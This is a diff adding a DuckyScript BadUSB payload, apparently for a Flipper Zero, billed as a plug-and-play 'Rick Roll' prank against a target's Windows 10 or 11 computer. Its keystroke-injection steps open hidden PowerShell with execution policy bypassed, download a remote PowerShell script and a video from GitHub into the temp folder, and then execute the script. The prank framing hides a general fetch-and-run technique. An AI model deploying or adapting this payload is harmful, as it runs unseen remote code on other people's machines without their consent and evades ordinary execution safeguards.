@@ -1,0 +1,34 @@
+REM     Title: ADV-RickRoll
+
+REM    Author: I am Jakoby, with mods by myself
+
+REM    Description: This is a one liner payload that will Rick Roll your target. Video will be played at full screen and max volume. 
+REM    Upon deployment, payload will pause until a mouse movement is detected and run once one is. 
+
+REM    Target: Windows 10, 11
+
+REM    --------------------------------------------------------------------------------------
+REM     THIS PAYLOAD IS PLUG AND PLAY. NO MODIFICATIONS NEEDED SIMPLY RUN THE CODE DOWN BELOW.
+REM     --------------------------------------------------------------------------------------
+
+DELAY 500
+
+REM    Run and get code
+GUI r
+DELAY 500
+STRING powershell -w h -NoP -NonI -Ep Bypass $D="$env:tmp";irm -Uri 'https://raw.githubusercontent.com/I-Am-Jakoby/Flipper-Zero-BadUSB/main/Payloads/Flip-ADV-RickRoll/rr.ps1' -O "$D\rr.ps1"
+ENTER
+DELAY 500
+
+REM    Run and get mp4
+GUI r
+DELAY 500
+STRING powershell -w h -NoP -NonI -Ep Bypass $D="$env:tmp";irm -Uri 'https://github.com/I-Am-Jakoby/Flipper-Zero-BadUSB/raw/main/Payloads/Flip-ADV-RickRoll/rr.mp4' -O "$D\rr.mp4"
+ENTER
+DELAY 5000
+
+REM    Run payload
+GUI r
+DELAY 500
+STRING powershell -w h -NoP -NonI -Ep Bypass $D="$env:tmp";. "$D\rr.ps1"
+ENTER
